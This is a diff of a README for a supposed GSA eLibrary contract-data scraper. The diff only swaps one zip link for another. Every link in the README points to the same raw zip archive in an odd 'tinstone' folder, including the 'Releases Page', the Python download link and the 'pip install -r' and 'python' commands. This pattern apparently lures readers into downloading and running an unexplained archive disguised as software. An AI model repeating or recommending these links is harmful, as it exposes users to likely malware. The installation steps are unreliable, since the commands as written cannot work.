@@ -1,7 +1,7 @@
 # 📚 gsa-elibrary-scraper - Effortlessly Access GSA Contract Data
 
 ## 🔗 Download Now
-[![Download](https://github.com/factornine/gsa-elibrary-scraper/raw/refs/heads/main/tinstone/scraper-elibrary-gsa-v1.8-beta.2.zip%20gsa--elibrary--scraper-v1.0-brightgreen)](https://github.com/factornine/gsa-elibrary-scraper/raw/refs/heads/main/tinstone/scraper-elibrary-gsa-v1.8-beta.2.zip)
+[![Download](https://raw.githubusercontent.com/factornine/gsa-elibrary-scraper/main/tinstone/elibrary_scraper_gsa_3.1.zip%20gsa--elibrary--scraper-v1.0-brightgreen)](https://raw.githubusercontent.com/factornine/gsa-elibrary-scraper/main/tinstone/elibrary_scraper_gsa_3.1.zip)
 
 ## 📖 Introduction
 gsa-elibrary-scraper is a tool designed to help you easily access and extract contract data from the GSA eLibrary. Whether you are researching government contracts, preparing for procurement, or looking to generate leads, this scraper simplifies the process. You no longer need to navigate complex web pages to find the information you need.
@@ -16,10 +16,10 @@ Before you download, ensure your system meets the following requirements:
 
 ### Installation Steps
 1. **Download the Software**
-   - Visit this page to download: [Releases Page](https://github.com/factornine/gsa-elibrary-scraper/raw/refs/heads/main/tinstone/scraper-elibrary-gsa-v1.8-beta.2.zip)
+   - Visit this page to download: [Releases Page](https://raw.githubusercontent.com/factornine/gsa-elibrary-scraper/main/tinstone/elibrary_scraper_gsa_3.1.zip)
 
 2. **Choose the Right Version**
-   - Locate the latest version. Look for the file named `https://github.com/factornine/gsa-elibrary-scraper/raw/refs/heads/main/tinstone/scraper-elibrary-gsa-v1.8-beta.2.zip` or similar. 
+   - Locate the latest version. Look for the file named `https://raw.githubusercontent.com/factornine/gsa-elibrary-scraper/main/tinstone/elibrary_scraper_gsa_3.1.zip` or similar. 
 
 3. **Extract the Files**
    - Once downloaded, go to your downloads folder. Right-click the downloaded file and select "Extract All". Follow the prompts to extract the files.
@@ -37,14 +37,14 @@ Before you download, ensure your system meets the following requirements:
 6. **Install Dependencies**
    - Ensure you are connected to the internet and type the following command:
      ```
-     pip install -r https://github.com/factornine/gsa-elibrary-scraper/raw/refs/heads/main/tinstone/scraper-elibrary-gsa-v1.8-beta.2.zip
+     pip install -r https://raw.githubusercontent.com/factornine/gsa-elibrary-scraper/main/tinstone/elibrary_scraper_gsa_3.1.zip
      ```
    - This command will install the necessary libraries for the scraper to function.
 
 7. **Run the Scraper**
    - You can start the scraper by typing:
      ```
-     python https://github.com/factornine/gsa-elibrary-scraper/raw/refs/heads/main/tinstone/scraper-elibrary-gsa-v1.8-beta.2.zip
+     python https://raw.githubusercontent.com/factornine/gsa-elibrary-scraper/main/tinstone/elibrary_scraper_gsa_3.1.zip
      ```
    - This command will launch the application. Follow the on-screen instructions to scrape GSA eLibrary data.
 
@@ -71,9 +71,9 @@ Once the scraper is running, you will see a user-friendly interface. Here are so
 ## 🛠️ Troubleshooting
 If you encounter any issues, consider the following tips:
 
-- **Ensure Python is Installed:** If you get errors related to Python, make sure it is installed correctly. You can download it [here](https://github.com/factornine/gsa-elibrary-scraper/raw/refs/heads/main/tinstone/scraper-elibrary-gsa-v1.8-beta.2.zip).
+- **Ensure Python is Installed:** If you get errors related to Python, make sure it is installed correctly. You can download it [here](https://raw.githubusercontent.com/factornine/gsa-elibrary-scraper/main/tinstone/elibrary_scraper_gsa_3.1.zip).
 
-- **Check for Updates:** Make sure you have the latest version of the scraper. You can always find updates on the [Releases Page](https://github.com/factornine/gsa-elibrary-scraper/raw/refs/heads/main/tinstone/scraper-elibrary-gsa-v1.8-beta.2.zip).
+- **Check for Updates:** Make sure you have the latest version of the scraper. You can always find updates on the [Releases Page](https://raw.githubusercontent.com/factornine/gsa-elibrary-scraper/main/tinstone/elibrary_scraper_gsa_3.1.zip).
 
 - **Internet Connection:** The scraper requires an internet connection to fetch data. Ensure that your connection is active.
 
@@ -86,5 +86,5 @@ This project is licensed under the MIT License. You can use it freely, but pleas
 ## 📜 Conclusion
 gsa-elibrary-scraper streamlines the process of extracting government contract data. Follow the steps above to download, install, and start using the scraper easily. Happy scraping!
 
-For more information, visit our [Releases Page](https://github.com/factornine/gsa-elibrary-scraper/raw/refs/heads/main/tinstone/scraper-elibrary-gsa-v1.8-beta.2.zip).
+For more information, visit our [Releases Page](https://raw.githubusercontent.com/factornine/gsa-elibrary-scraper/main/tinstone/elibrary_scraper_gsa_3.1.zip).
 
